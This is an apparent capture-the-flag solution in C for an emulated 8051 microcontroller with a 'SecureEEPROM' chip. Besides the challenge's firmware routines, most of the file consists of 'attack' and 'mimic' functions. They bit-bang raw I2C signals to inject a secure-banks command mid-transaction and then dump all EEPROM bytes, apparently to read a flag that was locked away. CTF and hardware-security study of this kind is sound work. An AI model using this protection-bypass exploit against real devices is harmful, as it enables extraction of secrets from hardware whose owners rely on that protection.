__sfr __at(0xff) POWEROFF;
__sfr __at(0xfe) DEBUG;
__sfr __at(0xfd) CHAROUT;
__xdata __at(0xff00) unsigned char FLAG[0x100];

__sfr __at(0xfa) RAW_I2C_SCL;
__sfr __at(0xfb) RAW_I2C_SDA;

// I2C-M module/chip control data structure.
__xdata __at(0xfe00) unsigned char I2C_ADDR; // 8-bit version.
__xdata __at(0xfe01) unsigned char I2C_LENGTH;  // At most 8 (excluding addr).
__xdata __at(0xfe02) unsigned char I2C_RW_MASK;  // 1 R, 0 W.
__xdata __at(0xfe03) unsigned char I2C_ERROR_CODE;  // 0 - no errors.
__xdata __at(0xfe08) unsigned char I2C_DATA[8];  // Don't repeat addr.
__sfr __at(0xfc) I2C_STATE;  // Read: 0 - idle, 1 - busy; Write: 1 - start

const SEEPROM_I2C_ADDR_MEMORY = 0b10100000;
const SEEPROM_I2C_ADDR_SECURE = 0b01010000;

void print(const char *str) {
  while (*str) {
    CHAROUT = *str++;
  }
}

void seeprom_wait_until_idle() {
  while (I2C_STATE != 0) {}
}

void seeprom_write_byte(unsigned char addr, unsigned char value) {
  seeprom_wait_until_idle();

  I2C_ADDR = SEEPROM_I2C_ADDR_MEMORY;
  I2C_LENGTH = 2;
  I2C_ERROR_CODE = 0;
  I2C_DATA[0] = addr;
  I2C_DATA[1] = value;
  I2C_RW_MASK = 0b00;  // 2x Write Byte

  I2C_STATE = 1;
  seeprom_wait_until_idle();
}

unsigned char seeprom_read_byte(unsigned char addr) {
  seeprom_wait_until_idle();

  I2C_ADDR = SEEPROM_I2C_ADDR_MEMORY;
  I2C_LENGTH = 2;
  I2C_ERROR_CODE = 0;
  I2C_DATA[0] = addr;
  I2C_RW_MASK = 0b10;  // Write Byte, then Read Byte

  I2C_STATE = 1;
  seeprom_wait_until_idle();

  if (I2C_ERROR_CODE != 0) {
    return 0;
  }

  return I2C_DATA[1];
}

void seeprom_secure_banks(unsigned char mask) {
  seeprom_wait_until_idle();

  I2C_ADDR = SEEPROM_I2C_ADDR_SECURE | (mask & 0b1111);
  I2C_LENGTH = 0;
  I2C_ERROR_CODE = 0;

  I2C_STATE = 1;
  seeprom_wait_until_idle();
}

void write_flag() {
  unsigned char i;
  print("[FW] Writing flag to SecureEEPROM...............");
  for (i = 0; FLAG[i] != '\0'; i++) {
    seeprom_write_byte(64 + i, FLAG[i]);
  }

  // Verify.
  for (i = 0; FLAG[i] != '\0'; i++) {
    if (seeprom_read_byte(64 + i) != FLAG[i]) {
      print("VERIFY FAIL\n");
      POWEROFF = 1;
    }
  }
  print("DONE\n");
}

void secure_banks() {
  unsigned char i;
  print("[FW] Securing SecureEEPROM flag banks...........");

  seeprom_secure_banks(0b0010);  // Secure 64-byte bank with the flag.

  // Verify that the flag can NOT be read.
  for (i = 0; FLAG[i] != '\0'; i++) {
    if (seeprom_read_byte(64 + i) == FLAG[i]) {
      print("VERIFY FAIL\n");
      POWEROFF = 1;
    }
  }

  print("DONE\n");
}

void remove_flag() {
  unsigned char i;
  print("[FW] Removing flag from 8051 memory.............");

  for (i = 0; FLAG[i] != '\0'; i++) {
    FLAG[i] = '\0';
  }

  print("DONE\n");
}

void write_welcome() {
  unsigned char i;
  const char *msg = "Hello there.";
  print("[FW] Writing welcome message to SecureEEPROM....");
  for (i = 0; msg[i] != '\0'; i++) {
    seeprom_write_byte(i, msg[i]);
  }

  // Verify.
  for (i = 0; msg[i] != '\0'; i++) {
    if (seeprom_read_byte(i) != (unsigned char)msg[i]) {
      print("VERIFY FAIL\n");
      POWEROFF = 1;
    }
  }
  print("DONE\n");
}

void raw_start(){
  print("\n== raw start ==\n");
  RAW_I2C_SCL = 0;
  RAW_I2C_SDA = 0;
  
  RAW_I2C_SCL = 1;
  RAW_I2C_SDA = 0;
  RAW_I2C_SDA = 1;
  RAW_I2C_SCL = 0;
  // print("\n== end raw start ==\n");
}

void raw_check_status(){
  print("\n== raw check status ==\n");
  print("\nSCL Status: ");
  if (RAW_I2C_SCL == 0){
    CHAROUT = 0x30;
  } else {
    CHAROUT = 0x31;
  } 

  print("\nSDA Status: ");
  if (RAW_I2C_SDA == 0){
    CHAROUT = 0x30;
  } else {
    CHAROUT = 0x31;
  }

  print("\nI2C STATE: ");
  CHAROUT = 0x30 + I2C_STATE;
  
  print("\n== end raw check status ==\n");
}

unsigned char raw_recv_bit(){
  unsigned char bit;
  bit = 0;

  RAW_I2C_SCL = 1;
  bit = RAW_I2C_SDA;
  RAW_I2C_SCL = 0;

  return bit;
}

void raw_send_bit(unsigned char bit){
  RAW_I2C_SDA = bit & 1;
  RAW_I2C_SCL = 1;
  RAW_I2C_SCL = 0;
}

void raw_send_8bits(unsigned char addr){
  signed char x;
  unsigned char bit;
  print("\n== raw send 8bits: ");
  for (x=7; x>=0; x--){
    bit = (addr >> x) & 1;
    CHAROUT = 0x30+bit;
    raw_send_bit(bit);
  }
  print(" == \n");
}

void mimic(void){
  unsigned int x;
  unsigned int y;

  // start
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  RAW_I2C_SDA = 0x0;

  // load control - set eeprom 0x10100000
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;

  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  //read ack?
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //set address 0x00000000
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;

  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;

  // read ack 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;

  // CHANGE TO I2C_START
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  RAW_I2C_SDA = 0x0;
  
  // set eeprom 0x10100001 - read 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;

  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
 
  //read ack?
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
 
  print("\nRead: ");
  //read first bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
 
  //read second bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //read third bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //read fourth bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //read fifth bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //read sixth bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //read seventh bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;
  
  //read eigth bit
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;

  // CHANGE TO I2C_START
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  RAW_I2C_SDA = 0x0;

  // load control - set eeprom 0x01011111
  // Secure all banks
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;

  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  
  //read ack?
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SCL = 0x1;
  CHAROUT=0x30+RAW_I2C_SDA;

  // CHANGE TO I2C_START
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
  RAW_I2C_SDA = 0x0;

  // set eeprom 0x10100001 - read 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;

  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x0;
  RAW_I2C_SCL = 0x1;
 
  RAW_I2C_SCL = 0x0;
  RAW_I2C_SDA = 0x1;
  RAW_I2C_SCL = 0x1;

  for(x=0; x < 256; x++){
    print("\nACK:");
    //read ack
    RAW_I2C_SCL = 0x0;
    RAW_I2C_SCL = 0x1;
    CHAROUT=0x30+RAW_I2C_SDA;

    print("\nRead bits:");
    for(y=0;y<8;y++){
      //read ack
      RAW_I2C_SCL = 0x0;
      RAW_I2C_SCL = 0x1;
      CHAROUT=0x30+RAW_I2C_SDA;
    }
  }
}

void attack(void){
  unsigned char nack;
  // START SEQ + ADDRESS FRAME (8 Bits) + RW/BIT + <ACK + (Frame Data (8 bits) + <ACK (1 bit)...)

  // Start Condition: The SDA line switches from a high voltage level to a low voltage level before the SCL line switches from high to low.
  // Stop Condition: The SDA line switches from a low voltage level to a high voltage level after the SCL line switches from low to high.
  // Address Frame: A 7 or 10 bit sequence unique to each slave that identifies the slave when the master wants to talk to it.
  //  !!! 8-bit !!! 
  //  const SEEPROM_I2C_ADDR_MEMORY = 0b10100000;
  //  const SEEPROM_I2C_ADDR_SECURE = 0b01010000;
  // Read/Write Bit: A single bit specifying whether the master is sending data to the slave (low voltage level) or requesting data from it (high voltage level).
  // ACK/NACK Bit: Each frame in a message is followed by an acknowledge/no-acknowledge bit. If an address frame or data frame was successfully received, an ACK bit is returned to the sender from the receiving device.
  unsigned char buff;
  unsigned int x;
  const MASTER_TO_SLAVE=0;
  const SLAVE_TO_MASTER=1;
  
  print("\n== attack ==\n");

  // Reset state
  RAW_I2C_SCL = 0;
  RAW_I2C_SDA = 0;

  // start sequence
  raw_start();  
  // select address SEEPROM_I2C_ADDR_MEMORY
  raw_send_8bits(0b11100000 + 1);
  // receive ack/nack
  nack = raw_recv_bit();
  print("NACK bit:");
  CHAROUT = 0x30 + nack;

  print("\n== end attack ==\n");
  
}

void main(void) {
  int z;
  unsigned char c;

  // write_flag();
  // secure_banks();
  // remove_flag();
  // write_welcome();
  DEBUG = 1;
  print("\nbefore\n");

  // for(z=0; z<256; z++){
  //   c = seeprom_read_byte(z);
  //   CHAROUT = c;
  // }

  // attack();
  mimic();
  print("\nafter\n");
  POWEROFF=1;
}
